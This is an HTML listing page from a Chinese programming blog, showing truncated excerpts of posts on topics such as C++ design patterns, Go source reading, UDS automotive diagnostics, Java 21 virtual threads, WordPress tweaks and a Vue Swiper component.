<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72c3d7f4166277deffb3cd92703dc601/" rel="bookmark">
			【数电笔记】56-消抖开关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
说明：
1. 按键抖动形成的原因
2. 按键消抖的方法
3. 用与非RS触发器构成消抖开关（硬件消抖）
说明： 笔记配套视频来源：B站本系列笔记并未记录所有章节，只对个人认为重要章节做了笔记；标题前面的数字标号就是对应的视频章节，请大家自行对应学习 1. 按键抖动形成的原因 2. 按键消抖的方法 3. 用与非RS触发器构成消抖开关（硬件消抖） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75938c44d056e3c8c84a9866c7e91ea9/" rel="bookmark">
			【数电笔记】57-同步RS触发器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
说明：
1. 同步触发器概念
2. 电路组成
3. 逻辑功能
同步RS触发器对应的逻辑符号
异步RS触发器对应的逻辑符号
4. 特性表与特性方程
5. 状态转换图
6. 例题
说明： 笔记配套视频来源：B站；本系列笔记并未记录所有章节，只对个人认为重要章节做了笔记；标题前面的数字标号就是对应的视频章节，请大家自行对应学习 1. 同步触发器概念 2. 电路组成 3. 逻辑功能 同步RS触发器对应的逻辑符号 异步RS触发器对应的逻辑符号 4. 特性表与特性方程 5. 状态转换图 化简图
6. 例题 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a010f50f44570be4a0360636725b63a3/" rel="bookmark">
			iOS 富文本属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、NSAttributedString属性列表: /** 富文本属性 NSFontAttributeName // 设置字体 NSForegroundColorAttributeName // 设置文字颜色 NSBackgroundColorAttributeName // 设置背景颜色 NSKernAttributeName // 设置字符间距 NSParagraphStyleAttributeName // 设置段落风格 NSStrikethroughStyleAttributeName // 添加删除线 NSStrikethroughColorAttributeName // 添加删除线颜色 NSUnderlineStyleAttributeName // 添加下划线 NSUnderlineColorAttributeName // 添加下划线颜色 NSStrokeColorAttributeName // 设置文字描边颜色 NSStrokeWidthAttributeName // 设置文字描边宽度 NSShadowAttributeName // 设置阴影 NSLigatureAttributeName // 设置连体属性 NSTextEffectAttributeName // 设置文本特殊效果 NSAttachmentAttributeName // 设置文本附件(一般用于图文混排，配合：NSTextAttachment对象使用) NSLinkAttributeName // 设置链接属性 NSBaselineOffsetAttributeName // 设置基线偏移量 NSObliquenessAttributeName // 设置字体倾斜 NSExpansionAttributeName // 设置文本扁平 NSWritingDirectionAttributeName // 设置文字书写方向 NSVerticalGlyphFormAttributeName // 设置文本段落排版格式(基本无用，iOS只支持横排) */ 二、富文本属性设置： 因富文本属性这些对应的''键''不是那么好找，所以直接封装成一个方法。调用方法比去找对应的键还是要方便一些：对NSMutableAttributedString的分类进行方法扩展。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a010f50f44570be4a0360636725b63a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e2a3264aacdd6691b0b0e49f7f2f434/" rel="bookmark">
			[每周一更]-(第76期)：Go源码阅读与分析的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读源码可以深层理解Go的编写方式，理解作者们的思维方式；也有助于对Go语法用法深刻的理解，我们从这一篇说一下如何读源码，从哪些源码着手，从
简单到深入的方式学习源码；
学习源码也是一个修炼过程，来修补自己代码上不规范的方式和更优化的方式；
查看方式 直接下载源码 git clone https://github.com/golang/go.git 在goland或vscode中查看对应的源码，提供了代码导航、跳转到定义、查找引用等功能。 阅读方式 阅读路线：
标准库： 从阅读 Go 的标准库开始是一个不错的选择。标准库是学习 Go 的核心，包括诸如 fmt、net、http 等包。
Go Runtime： 学习 Go 的运行时系统是深入理解语言的重要一步。阅读 runtime 包和与调度器、垃圾回收器相关的代码。
Go Tools： 了解 Go 工具链是一个好主意，包括 go build、go test 等。这有助于理解代码是如何构建和测试的。
Go Compiler： 如果你对编译器和语言的底层工作原理感兴趣，可以阅读 Go 的编译器源码。
Go Web 框架： 如果你对 Web 开发感兴趣，可以阅读一些知名的 Go Web 框架的源码，比如 Gin、Echo、Beego。
Go 源码库： 最终，你可以尝试阅读更底层的 Go 源码，如 cmd 目录下的一些工具，以及 src 目录下的 runtime。
更好地阅读和理解Go的源码：
阅读测试代码： Go项目通常会伴随有大量的测试代码。测试代码对于理解一个函数或模块的使用方法和预期行为非常有帮助。阅读示例代码： Go的文档中经常包含示例代码，这些示例代码可以帮助你理解如何正确使用某个包或函数。了解Go的工具链： Go语言有一套强大的工具链，包括go build、go test、go run等。了解这些工具的使用可以帮助你理解Go项目的构建和测试流程。阅读注释： Go语言的代码通常包含丰富的注释，特别是在核心库中。这些注释解释了代码的设计思想和某些实现细节。深入阅读核心库： 如果你对Go语言的核心库实现感兴趣，可以深入阅读src/runtime和src/reflect等目录下的源代码。 举例 Go 语言编译器的源代码在 src/cmd/compile 目录中，目录下的文件共同组成了 Go 语言的编译器，学过编译原理的人可能听说过编译器的前端和后端，编译器的前端一般承担着词法分析、语法分析、类型检查和中间代码生成几部分工作，而编译器后端主要负责目标代码的生成和优化，也就是将中间代码翻译成目标机器能够运行的二进制机器码。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e2a3264aacdd6691b0b0e49f7f2f434/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d19bd0c10e1c422aa27bc48d0267cc18/" rel="bookmark">
			UDS诊断 10服务的肯定响应码后面跟着一串数据的含义，以及诊断报文格式定义介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、首先看一下10服务的请求报文和肯定响应报文格式 a.诊断仪发送的请求报文格式
b.ECU回复的肯定响应报文格式
c.肯定响应报文中参数定义
二、例程数据解析 a.例程数据
0.000000 1 725 Tx d 8 02 10 03 00 00 00 00 00
0.000806 1 7A5 Rx d 8 06 50 03 00 32 01 F4 CC
b.解析诊断仪发送的数据
725 Tx d 8 02 10 03 00 00 00 00 00
c.解析ECU回复的肯定响应数据
7A5 Rx d 8 06 50 03 00 32 01 F4 CC
三、诊断报文格式定义以及时间参数定义 a.诊断报文格式定义
b.部分时间参数定义
四、总结 由此可见，10服务的肯定响应码后面跟着一串数据的含义是表示的时间参数；
00 32 表示P2_server参数，0x0032转换为十进制为50ms，即ECU 接收到请求报文后发送响应报文的间隔时间；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d19bd0c10e1c422aa27bc48d0267cc18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1730f8674b84566cc528f6584fd248c7/" rel="bookmark">
			设计模式：C&#43;&#43;如何实现一个高质量的单例模式，双重校验锁 懒汉多线程安全 ，还得考虑防止编译器优化、异常死锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		已同步到公众号[蚂蚁博士军团][码蚁软件] 👇
如何实现一个高质量的单例模式，项目中经常使用，但是你可能不知道
目录
前言： 一、作用
二、实现
三、分类
四、实现方式
1、采用指针的方式来保存全局对象
1.1、指针饿汉：
1.2、指针懒汉
2、采用对象的方式来保存全局对象
如果还有更多补充的，可以在评论区一起讨论哈。
前言： 众所周知，设计模式有23种，其中单例模式是用得非常广泛的，也是很多人经常面试被问到的问题，当然工作中也是经常用到的设计模式，我们一起来聊聊单例模式。
一、作用 单例模式能保证全局有且只有一个实例对象；
二、实现 一般情况下，得控制对象的生成、释放，使其私有化，可以禁用或屏蔽掉一些构造函数、析构函数、拷贝构造函数、重载等号赋值函数等，使其不能被外部直接使用；同时为了保证全局唯一性，得提供一个静态成员变量来保存这个全局实例；为了能让使用者可以拿到对象，还得提供一个公有的静态函数，让使用者可以直接拿到对象。如果采用指针的方式来保存和创建对象，还得考虑添加一个释放函数，防止内存泄露。
总结下来，实现需要处理三点：
1、控制对象生成：私有化构造、析构、拷贝构造、重载等号赋值函数；
2、私有的静态成员变量：保存对象
3、公有的静态成员函数：可以生成对象并返回对象
三、分类 由于需要使用到静态成员变量来保存对象，静态成员变量初始化的内容不同，就可以产生2种单例模式，分别为饿汉单例、懒汉单例；
饿汉单例：即静态成员变量初始化就给内存，用空间换时间；意思是很饿，需要随时可以拿到吃的，顾名思义为饿汉模式；
懒汉单例：即静态成员变量初始化为空，需要使用了再给内存，用时间换空间；意思是现在不饿，等饿了再拿，饿了再去做吃的，故为懒汉单例；
四、实现方式 1、采用指针的方式来保存全局对象 1.1、指针饿汉： 这种实现方式，在饿汉单例里面，不需要考虑太多，直接返回对象指针即可；
#include &lt;iostream&gt; #include &lt;mutex&gt; using namespace std; mutex g_mutex; // 全局互斥锁 class Singleton { private: Singleton(){} ~Singleton(){} Singleton(const Singleton &amp;t){} void operator=(const Singleton &amp;t){} static Singleton *s_obj; // volatile 防止编译器优化，保证从原始内存读数据，而不是从寄存器读取 public: static Singleton* getInstance() { return s_obj; } void release() { if (s_obj) { delete s_obj; s_obj = nullptr; } } }; Singleton* Singleton::s_obj = new Singleton; // 饿汉单例，空间换时间 int main() { Singleton *a = Singleton::getInstance(); Singleton *b = Singleton::getInstance(); cout &lt;&lt; a &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1730f8674b84566cc528f6584fd248c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60a1d4bddf6cd873baf64249812bd38f/" rel="bookmark">
			工厂模式：简单工厂知多少？原理、示例代码、场景及优缺点？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		已同步的公众号【蚂蚁博士军团】【码蚁软件】：
工厂模式：简单工厂知多少？原理、示例代码、场景及优缺点？
前言： 工厂模式中，另一种用得很多的模式是简单工厂模式，直奔主题。
一、简单工厂原理、示例代码 简单工厂模式是一种创建型设计模式，它提供了一个统一的接口来实例化一组相关或相似的对象，而无需暴露对象的创建逻辑。在简单工厂模式中，客户端通过向工厂类传递参数来获取所需的对象实例，而无需直接调用对象的构造函数。
以下是一个简单的C++源码实现：
#include &lt;iostream&gt; using namespace std; // 定义一个抽象的产品类 class Product { public: virtual void use() = 0; }; // 具体产品类A class ConcreteProductA : public Product { public: void use() override { cout &lt;&lt; "Using Product A" &lt;&lt; endl; } }; // 具体产品类B class ConcreteProductB : public Product { public: void use() override { cout &lt;&lt; "Using Product B" &lt;&lt; endl; } }; // 简单工厂类 class SimpleFactory { public: // 根据传入的参数创建相应的产品实例 static Product* createProduct(char productType) { Product* product = nullptr; switch (productType) { case 'A': product = new ConcreteProductA(); break; case 'B': product = new ConcreteProductB(); break; default: break; } return product; } }; int main() { // 通过简单工厂创建产品实例 Product* productA = SimpleFactory::createProduct('A'); Product* productB = SimpleFactory::createProduct('B'); // 使用产品实例 productA-&gt;use(); productB-&gt;use(); delete productA; delete productB; return 0; } 在上面的示例中，我们定义了一个抽象的产品类 Product，并实现了两个具体产品类 ConcreteProductA 和 ConcreteProductB。然后，我们创建了一个简单工厂类 SimpleFactory，它包含一个静态方法 createProduct，根据传入的参数来实例化相应的产品对象。在 main 函数中，我们通过简单工厂类创建了产品实例，并调用了产品的 use 方法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60a1d4bddf6cd873baf64249812bd38f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37ecf8bb99371e5f289d13f4e345fbd4/" rel="bookmark">
			C#中如何借助委托|反射|表达式来传递类对象属性的“引用”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		using System.Linq.Expressions; using System.Reflection; namespace ConsoleApp1 { internal class Program { static void Main(string[] args) { Demon demon = new() { MyField = 1, MyProperty = 2, }; //修改字段 void Modify&lt;T&gt;(ref T field, T newValue) { field = newValue; } //通过 传入Action 闭包修改属性 void ModifyProperty&lt;T&gt;(Action&lt;T&gt; action, T newValue) { action.Invoke(newValue); } //通过 反射修改属性 void ModifyPropertyByRelection&lt;TClass, TProperty&gt;(MethodInfo methodInfo, TClass target,TProperty newValue) { methodInfo.Invoke(target, new object?[] { newValue }); } //通过 表达式树修改属性 void ModifyPropertyWithExpression&lt;TProperty, TClass&gt;(Expression&lt;Func&lt;Demon, TProperty&gt;&gt; expression, TClass target, TProperty newValue) { var body = (MemberExpression)expression.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37ecf8bb99371e5f289d13f4e345fbd4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c447dd74a7f7a7de2a6ac0ceb752b3a0/" rel="bookmark">
			UE4 面试题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、new与malloc的区别
new：
new首先会去调用operator new函数，申请足够的内存（大多数底层用malloc实现），然后调用类型的构造函数来初始化变量，最后返回自定义类型的指针，delete先调用析构函数，然后调用operator delete函数释放内存（大多数底层用free实现）
__cdecl 是C Declaration的缩写（declaration，声明）
malloc：
malloc是库函数，只能申请内存，没有初始化功能
所以new与malloc最大的区别就是new能进行构造函数初始化
2、strcpy、sprintf、memcpy的区别
strcpy：用于将一个字符串复制到另一个字符串中
sprintf：sprintf函数用于将格式化的字符串输出到一个字符数组中
char str[10]; int num = 4; sprintf(str, "number is %d", num); printf("%s\n", str); // 输出 number is 4 memcpy：用于将一个内存地址的数据复制到另一个内存地址中
3、子弹穿墙问题
子弹向前打出一个身位长的射线，若打到了墙面则开始计算子弹与墙的距离，在通过距离除以速度算出时间，时间过后则进行碰撞
4、UE4如何切关卡后保留数据
存放在GameInstancesubsystem中，不要存在gameinstance内，这样会导致项目臃肿
5、UE4客户端能否使用AIController
不可以，在DS（dedicated server）模型下，AIController只存在于服务端，其主要是通过在服务端对Pawn进行操控，
然后再同步到客户端。
6、Blueprintable与NotBlueprintable
将C++类加入蓝图类
如果为NotBlueprintable则不能被蓝图化
7、BlueprintImplementEvent与BlueprintNativeEvent的区别
如果实现了蓝图，那么C++的Implement接口则不调用
如果没写蓝图接口则调用C++接口
而BlueprintImplementEvent只是做接口给蓝图，不拓展C++接口。
8、C++类中默认有什么函数
1、构造函数
2、拷贝构造函数
3、析构函数
4、重载赋值运算符函数
9、UE4生命周期
从先到后：UGameEngine-&gt;GameInstance-&gt;World和WorldContext-&gt;PersistentLevel-&gt;GameMode-&gt;GameState-&gt;PlayerController-&gt;PlayerState-&gt;HUD-&gt;Character
在UGameEngine（继承自UEngine）
首先UEngine的子类有UGameEngine和UEditorEngine，UEngine中的GEngine有访问UE的全局资源，是一个很重要的指针。
void UGameEngine::Init(IEngineLoop* InEngineLoop) { DECLARE_SCOPE_CYCLE_COUNTER(TEXT("UGameEngine Init"), STAT_GameEngineStartup, STATGROUP_LoadTime); // Call base. UEngine::Init(InEngineLoop); #if USE_NETWORK_PROFILER FString NetworkProfilerTag; if( FParse::Value(FCommandLine::Get(), TEXT("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c447dd74a7f7a7de2a6ac0ceb752b3a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba629cf6a441ed767cbf9d08d10396a5/" rel="bookmark">
			Premiere Pro 2024 新功能有哪些？视频剪辑软件PR2024更新内容及问题修复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PR软件“基于文本的编辑”中的填充词检测与批量删除功能
“基于文本的编辑”可让您检测“呃”和“嗯”填充词并批量删除它们，从而使您的转录文本更加准确。就像处理停顿一样，您可以单击填充词并将其从序列转录文本中删除。填充词与语言无关，因此可以使用语音到文本中支持的所有 18 种语言来处理它们。
注意：您可以通过单击文本面板右上角的三个点，然后选择转录文本视图选项，来调整 Premiere Pro 可以检测到的最短停顿长度。
查找并批量删除文本、填充词或停顿，以提高转录文本的准确度。👆
重新设计的 MOGRT 管理功能
动态图形模板 (MOGRT) 为使用 Premiere Pro 开展工作的编辑人员带来 After Effects 动态图形的强大功能，这些图形被打包为模板，同时配有可在 Premiere Pro 中自定义的简单易用的控件。
根据用户的反馈，Adobe官方改进了 MOGRT 的管理界面，使其变得更加直观。更轻松地跨多个位置（包括通过磁盘上的文件夹）查找、查看和组织 MOGRT 集合。
跨多个位置组织您的 MOGRT 集合。👆
现在将 MOGRT 显示为带有复选标记的单独行，而不是在下拉菜单中显示，从而可以更直接地浏览不同位置的集合。
现在有两个视图可用于浏览 MOGRT。浏览器树视图可显示 MOGRT 的位置。下面的 MOGRT 视图展示了选定位置中的所有缩略图模板。您可以通过上下拖动窗口来完全控制每个视图占用的空间，或单击顶部的漏斗按钮以关闭和打开浏览器树视图。
新序列预设
使用适用于 HD、UHD、HDR 和社交媒体项目的新序列预设，快速创建序列。序列预设也经过重新组织和简化，让最常用的选项触手可及。
要查看新预设，请导航到文件 &gt; 新建序列或单击项目面板上的新建项 &gt; 新建序列按钮。现在提供了一个简化的预设列表，其中包括：
HD 1080p
社交媒体 - 4x5、9x16 和 1x1 时间轴
UHD (HDR) - 具有 HDR 色彩空间的 2160p 时间轴
UHD (4K) - 具有 SDR 色彩空间的 2160p 时间轴
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba629cf6a441ed767cbf9d08d10396a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e9309780a8a96b428950782e39cfbe3/" rel="bookmark">
			Astra主题二次开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Astra主题二次开发 在header.php引入bootstrap5的svg图标 通过CDN引入，但是有时候可能会加载缓慢
&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css"&gt; 下载icon文件到本地引入，需要用到bootstrap-icons.min.css和fonts文件夹
添加博文页面的阅读次数统计功能 在functions.php中添加以下代码到post_meta数据库
// 获取文章的阅读次数 function get_post_views ($post_id) { $count_key = 'views'; $count = get_post_meta($post_id, $count_key, true); if ($count == '') { delete_post_meta($post_id, $count_key); add_post_meta($post_id, $count_key, '0'); $count = '0'; } return number_format_i18n($count); } // 设置更新文章的阅读次数 function set_post_views () { global $post; $post_id = $post -&gt; ID; $count_key = 'views'; $count = get_post_meta($post_id, $count_key, true); if (is_single() || is_page()) { if ($count == '') { delete_post_meta($post_id, $count_key); add_post_meta($post_id, $count_key, '1'); } else { update_post_meta($post_id, $count_key, $count + 1); } } } add_action('get_header', 'set_post_views'); 在博文页面中显示，进入主题目录/inc/blog，打开博客配置文件blog-config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e9309780a8a96b428950782e39cfbe3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66f0260f301776b7bc5f44dd3a8d7265/" rel="bookmark">
			Yapi禁用注册后新增管理员添加用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是参考了大佬的文章做的，稍做补充：https://www.jianshu.com/p/4a9e522d609e
原文中提示修改vendors/client/containers/User/List.js文件，但是缺少下面这段代码，在第8行插入下面的代码
import { Table, Popconfirm, message, Input, Button, Modal, Row, Col } from 'antd'; 还有添加的位置也没说清楚，这里补充一下，修改vendors/client/containers/User/List.js文件，在第227行下面插入下面的代码：
按钮和模态窗
/* 在第227行下面添加下面的代码 */ return ( &lt;section className="user-table"&gt; {/* &lt;div className="user-search-wrapper"&gt; &lt;h2 style={{ marginBottom: '10px' }}&gt;用户总数：{this.state.total}位&lt;/h2&gt; &lt;Search onChange={e =&gt; this.handleSearch(e.target.value)} onSearch={this.handleSearch} placeholder="请输入用户名" /&gt; &lt;/div&gt; */} &lt;div className="user-search-wrapper"&gt; &lt;div style={{ marginBottom: '10px' }}&gt; &lt;Button type="primary" onClick={() =&gt; this.setState({ addUserVisible: true })}&gt;添加用户&lt;/Button&gt; &lt;/div&gt; &lt;h2 style={{ marginBottom: '10px' }}&gt;用户总数：{this.state.total}位&lt;/h2&gt; &lt;Search onChange={e =&gt; this.handleSearch(e.target.value)} onSearch={this.handleSearch} placeholder="请输入用户名" /&gt; &lt;/div&gt; &lt;Table bordered={true} rowKey={record =&gt; record.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66f0260f301776b7bc5f44dd3a8d7265/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d68104c1d8dad89667211f323a605fc/" rel="bookmark">
			WORDPRESS 使用过程中的问题及解决方法记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WORDPRESS 使用过程中的问题及解决方法记录 重置wordpress后台密码 &lt;?php function wp_hash_password( $password ) { global $wp_hasher; if ( empty( $wp_hasher ) ) { require_once('./wp-includes/class-phpass.php'); // By default, use the portable hash from phpass. $wp_hasher = new PasswordHash( 8, true ); } return $wp_hasher-&gt;HashPassword( trim( $password ) ); } echo wp_hash_password( "helloworld" ); ?&gt; 把这个密码在数据库替换即可用这个密码登陆
迁移后网站链接出错，更改固定链接后无法发布新页面。 此响应不是合法的JSON响应
Nginx需要改一下网站的Nginx配置文件
location / { try_files $uri $uri/ /index.php?$args; } 主题添加自定义模版支持 在functions.php文件尾部添加
#添加自定义模版支持 add_theme_support('page-templates'); 自定义elementor代码片段 function custom_table_shortcode($atts) { echo ' &lt;div&gt; &lt;input type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d68104c1d8dad89667211f323a605fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b47186d7cf6df5570766c6f514849b0/" rel="bookmark">
			Java 21 的虚拟线程：高性能并发应用的福音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 21 最重要的特性之一就是虚拟线程 (JEP 444)。这些轻量级的线程降低了编写、维护和观察高吞吐量并行应用所需的努力。
在讨论新特性之前，让我们先看一下当前的状态，以便更好地理解它试图解决什么问题以及带来了哪些好处。
平台线程 在引入虚拟线程之前，我们习惯使用的线程是 java.lang.Thread，它背后是所谓的平台线程 (platform threads)。
这些线程通常与操作系统调度的内核线程一一映射。操作系统线程相当“重”，这使得它们适合执行所有类型的任务。
根据操作系统和配置，它们默认情况下会消耗大约2到10 MB的内存。因此，如果你想在高负载并发应用程序中使用一百万个线程，最好要有超过2 TB的可用内存！
这存在一个明显的瓶颈，限制了我们实际可以在没有缺点的情况下拥有的线程数量。
每个请求一个线程 这很成问题，因为它直接与典型的服务器应用程序“每个请求一个线程”的方法相冲突。使用每个请求一个线程有很多优点，例如更简单的状态管理和清理。但它也创造了可扩展性限制。应用程序的“并发单位”，在这种情况下是一个请求，需要一个“平台并发单位”。因此，线程很容易被原始CPU能力或网络耗尽。
即使“每个请求一个线程”有许多优点，共享重量级的线程可以更均匀地利用硬件，但也需要一种完全不同的方法。
异步救援 而不是在单个线程上运行整个请求，它的每个部分都从池中使用一个线程，当它们的任务完成时，另一个任务可能会重用同一个线程。这允许代码需要更少的线程，但引入了异步编程的负担。
异步编程伴随着它自己的范例，具有一定的学习曲线，并且可能会使程序更难理解和跟踪。请求的每个部分可能都在不同的线程上执行，从而创建没有合理上下文的堆栈跟踪，并使调试某些内容变得非常棘手甚至几乎不可能。
Java有一个用于异步编程的优秀API，CompletableFuture。但这是一个复杂的API，并且不太适合许多Java开发人员习惯的思维方式。
重新审视“每个请求一个线程”模型，很明显，一种更轻量级的线程方法可以解决瓶颈并提供一种熟悉的做事方式。
轻量级线程 由于平台线程的数量是无法在没有更多硬件的情况下改变的，因此需要另一个抽象层，切断可怕的 1:1 映射，它是首先造成瓶颈的原因。
轻量级线程不与特定的平台线程绑定，也不会伴随大量的预分配内存。它们由运行时而不是底层操作系统调度和管理。这就是为什么可以创建大量轻量级线程的原因。
这个概念并不新鲜，许多语言都采用某种形式的轻量级线程：
Go 语言中的 GoroutineErlang 进程Haskell 线程等等 Java最终于第21版中引入了自己的轻量级线程实现：虚拟线程 (Virtual Threads)。
虚拟线程 虚拟线程是一种新的轻量级java.lang.Thread变体，是Project Loom的一部分，它不是由操作系统管理或调度的。相反，JVM负责调度。
当然，任何实际的工作都必须在平台线程中运行，但是JVM使用所谓的“载体线程”(carrier threads) 来“携带”任何虚拟线程，以便在它们需要执行时执行这些线程。
所需的平台线程在一个 FIFO 工作窃取 ForkJoinPool 中进行管理，该池默认情况下使用所有可用的处理器，但可以通过调整系统属性jdk.virtualThreadScheduler.parallelism来根据需求进行修改。
ForkJoinPool与其他功能（例如并行流）使用的通用池之间的主要区别在于，通用池以LIFO模式运行。
廉价且丰富的线程 拥有廉价且轻量级的线程，可以使用“每个请求一个线程”模型，而不必担心实际需要多少个线程。如果你的代码在虚拟线程中调用阻塞 I/O 操作，则运行时会挂起虚拟线程，直到它可以稍后恢复。
这样，硬件就可以被优化到几乎最佳的水平，从而实现高水平的并发性，因此也实现高吞吐量。
因为它们非常廉价，所以虚拟线程不会被重用或需要池化。每个任务都由其自己的虚拟线程表示。
设置边界 调度器负责管理载体线程，因此需要一定的边界和分离，以确保可能的“无数”虚拟线程按照预期运行。这是通过在载体线程及其可能携带的任何虚拟线程之间不保持线程关联来实现的：
虚拟线程无法访问载体，Thread.currentThread() 返回虚拟线程本身。堆栈跟踪是分开的，任何在虚拟线程中抛出的异常只包含其自己的堆栈帧。虚拟线程的线程局部变量对它的载体不可用，反之亦然。从代码的角度来看，载体及其虚拟线程共享一个平台线程是不可见的。 让我们看看代码 使用Virtual Threads最大的好处是，你不需要学习新的范例或复杂的API，就像使用异步编程一样。相反，你可以像对待非虚拟线程一样处理它们。
创建平台线程 创建平台线程很简单，就像使用 Runnable 创建一样：
Runnable fn = () -&gt; { // your code here }; Thread thread = new Thread(fn).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b47186d7cf6df5570766c6f514849b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/605d9d0f6851ab2b282113cbaf717da0/" rel="bookmark">
			【vue&#43;Swiper】vue中使用swiper缩略图，展示一张大图及n张小图，点击小图切换不同的大图展示，完整代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果：
这是在swiper官网上找的示例，swiper太强大了，有非常多不同的示例,有api，有教程，还可以下载示例代码。
但是第一次使用，研究这个缩略图的实现还是花了几个小时，好在实现了。
swiper官网请戳这里
安装
npm i swiper 将swiper封装成组件可以复用，在components公共组件文件夹中新增swiper文件夹，新增index.vue
选择API文档，Thumbs（缩略图），可以查看缩略图的使用示例
ps：这里要补充下，示例其实挺清楚的，但是因为没有对应的html参考，所以我在这里多花了一点时间。swiper缩略图的实现其实是new Swiper了两个swiper实例，然后通过给主图所在的swiper实例的thumbs对象配置缩略图所在的swiper进行关联。
如果想看完整的示例代码，需要下载它的示例，我下载的是第一个
注意点： 1、加载插件，需要用到的文件有swiper-bundle.min.js和swiper-bundle.min.css文件
在public文件夹的index.html中引入
&lt;link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css" /&gt; &lt;script src="https://unpkg.com/swiper/swiper-bundle.min.js"&gt;&lt;/script&gt; 2、添加HTML内容。Swiper7的默认容器是’.swiper’，Swiper6之前是’.swiper-container’，我这里是’swiper‘，可以再加类名，但是默认类名一定是’swiper‘。
3、初始化Swiper var swiper = new Swiper(“#mySwiper”, {}）
4、主图与缩略图关联，将点击缩略图的activeIndex传给主图的slideTo方法中
完整代码：
componeents/swiper/index
